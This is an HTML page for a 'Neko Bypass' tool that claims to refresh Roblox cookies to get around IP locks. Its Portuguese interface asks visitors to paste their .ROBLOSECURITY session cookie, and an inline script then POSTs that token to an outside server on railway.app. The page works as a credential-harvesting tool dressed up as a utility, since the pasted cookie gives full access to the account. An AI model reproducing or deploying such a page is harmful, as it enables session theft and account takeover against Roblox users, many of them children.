<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow">
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <meta property="og:title" content="Neko Bypass">
    <meta property="og:description" content="Website that changes cookies Roblox">
    <meta name="keywords" content="Roblox IP restriction bypass, Unblock restricted IP on Roblox, Bypass Roblox IP lock, Access blocked Roblox IP, Roblox IP unblocker, Overcoming Roblox IP restrictions, Roblox IP block bypass, Bypassing Roblox IP lock, Roblox IP restriction removal, Unlocking blocked Roblox IP, roblox, robux, roblox ip lock, roblox ip lock bypass, rbxfresh" />
    <meta property="og:image" content="/assets/img/icon/180x180.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/icon/apple/180x180.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/icon/32x32.ico" />
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/icon/16x16.ico" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
    <link rel="stylesheet" href="/assets/css/styles.css">
    <title>Neko Bypass</title>
    <style>
        body {
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
        }
        .main-content {
            text-align: center;
            margin-top: 50px;
        }
        .main-title {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .main-subtitle {
            font-size: 20px;
            margin-bottom: 20px;
        }
        .main-input {
            width: 60%;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: none;
        }
        .main-button {
            padding: 10px 20px;
            background-color: #FF4E4E;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
        }
        .main-button:hover {
            background-color: #ff3434;
        }
        .main-response {
            margin-top: 20px;
            font-size: 16px;
            color: #0f0;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <h1 class="main-title">Neko Bypass</h1>
        <p class="main-subtitle">Cole seu .ROBLOSECURITY para fazer o refresh</p>
        <input type="text" id="cookie" class="main-input" placeholder="Cole seu .ROBLOSECURITY aqui">
        <br>
        <button onclick="enviarCookie()" class="main-button">Refresh</button>
        <p id="resposta" class="main-response"></p>
    </div>

    <script>
        async function enviarCookie() {
            const cookie = document.getElementById("cookie").value;
            const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cookie })
            });

            try {
                const dados = await resposta.json();
                document.getElementById("resposta").innerText = JSON.stringify(dados);
            } catch (err) {
                document.getElementById("resposta").innerText = "Erro ao processar a resposta.";
            }
        }
    </script>
</body>
</html>
